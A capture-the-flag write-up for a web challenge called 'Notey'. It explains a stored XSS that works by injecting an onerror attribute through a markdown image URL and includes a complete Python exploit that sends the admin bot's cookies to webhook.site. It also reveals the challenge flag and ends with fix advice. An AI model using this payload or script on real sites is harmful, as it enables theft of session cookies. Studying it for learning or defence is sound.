# Notey
---
## Challenge Info
- Name: Notey
- Category: Web
- Difficulty: Easy
- Instance: http://ctf.vulnbydefault.com:36760
- Flag format: VBD{...}

---

## TL;DR
The app sanitizes markdown before converting it to HTML. The markdown renderer (`slimdown-js`) inserts image/link URL content into HTML attributes without escaping quotes.

So we inject a malicious markdown image URL:

![x](x" onerror="location='https://webhook.site/<token>?c='+document.cookie")

When admin bot visits the note via `/api/visit`, `onerror` executes and exfiltrates cookies (including `flag`) to webhook.site.

---

## Root Cause Analysis

### 1) Dangerous rendering order
In note page rendering:
- Input markdown is sanitized with DOMPurify first
- Then converted into HTML with `slimdown-js`

If markdown-to-HTML step is unsafe, sanitizing first is ineffective.

### 2) Vulnerable markdown parser behavior
`slimdown-js` rule (from dist build) for images:

- `![alt](url)` â†’ `<img src="$2" alt="$1">`

The captured URL is inserted directly into `src` without escaping quotes.
That allows attribute injection by breaking out of `src` and adding `onerror`.

### 3) Bot with sensitive cookie
`/api/visit` triggers Puppeteer bot that sets:
- `flag` cookie (not HttpOnly)
- admin session cookie

Then bot visits attacker-controlled note URL, executing payload.

---

## Exploitation Steps

1. Create attacker account (`/api/auth/signup`, `/api/auth/signin`).
2. Create webhook.site token (`POST https://webhook.site/token`).
3. Create malicious note with image URL-attribute injection payload.
4. Trigger bot via `POST /api/visit` with malicious note UUID.
5. Poll `GET https://webhook.site/token/<uuid>/requests`.
6. Extract `VBD{...}` from exfiltrated `c` query parameter.

---

## Exploit Script
Saved as: 1. ctf/notey-web/exploit_notey.py

```python
import json
import re
import secrets
import string
import time
import requests

BASE = "http://ctf.vulnbydefault.com:36760"

s = requests.Session()


def rand(n=8):
    return ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def must(cond, msg):
    if not cond:
        raise RuntimeError(msg)


username = f"u_{rand()}"
password = f"P_{rand(12)}"
print(f"[*] Target: {BASE}")
print(f"[*] User: {username}")

# 1) signup
r = s.post(f"{BASE}/api/auth/signup", json={"username": username, "password": password}, timeout=20)
r.raise_for_status()
must(r.status_code == 200, f"Signup failed: {r.text}")
print("[+] Signup ok")

# 2) signin
r = s.post(f"{BASE}/api/auth/signin", json={"username": username, "password": password}, timeout=20)
r.raise_for_status()
must(r.status_code == 200, f"Signin failed: {r.text}")
attacker_token = s.cookies.get("session")
must(attacker_token, "No session cookie after signin")
print("[+] Signin ok, got session token")

# 3) webhook token
wr = requests.post("https://webhook.site/token", timeout=20)
wr.raise_for_status()
token = wr.json()["uuid"]
hook_url = f"https://webhook.site/{token}"
print(f"[+] Webhook token: {token}")

# 4) XSS payload via markdown image URL injection
payload = f"![x](x\" onerror=\"location='{hook_url}?c='+document.cookie\")"

r = s.post(
    f"{BASE}/api/notes",
    json={"title": "xss-exfil", "content": payload},
    timeout=20,
)
r.raise_for_status()
note_id = r.json().get("id")
must(note_id, "No note id returned")
print(f"[+] Created malicious note: {note_id}")

# 5) report to bot
r = s.post(f"{BASE}/api/visit", data={"noteId": note_id}, timeout=20)
r.raise_for_status()
print(f"[+] Reported note to bot: {r.text[:120]}")

# 6) poll webhook and parse flag
flag = None
for _ in range(20):
    time.sleep(2)
    lr = requests.get(f"https://webhook.site/token/{token}/requests", timeout=20)
    lr.raise_for_status()
    data = lr.json().get("data", [])
    if not data:
        continue

    for req in data:
        query = req.get("query", {}) or {}
        c = query.get("c")
        if c:
            m = re.search(r"VBD\{[^}]+\}", c)
            if m:
                flag = m.group(0)
                break
    if flag:
        break

if not flag:
    raise RuntimeError("Failed to retrieve flag from webhook requests")

print(f"\n[FLAG] {flag}")
```

Run:

```bash
C:/Users/stxrdust/AppData/Local/Programs/Python/Python38/python.exe "c:\Users\stxrdust\Desktop\Internships\Deltaware_Solution\1. ctf\notey-web\exploit_notey.py"
```

---

## Flag

VBD{m4rkd0wn_1s_n0t_s3cur3_f031aa747dafeb8c6d39b8b6caf4a72b}

---

## Fix Recommendations
1. Render markdown first, sanitize resulting HTML second.
2. Use a markdown parser that escapes attributes safely by default.
3. Add CSP to reduce script execution impact.
4. Keep sensitive values out of readable cookies (`HttpOnly`, avoid client-readable flag at all).

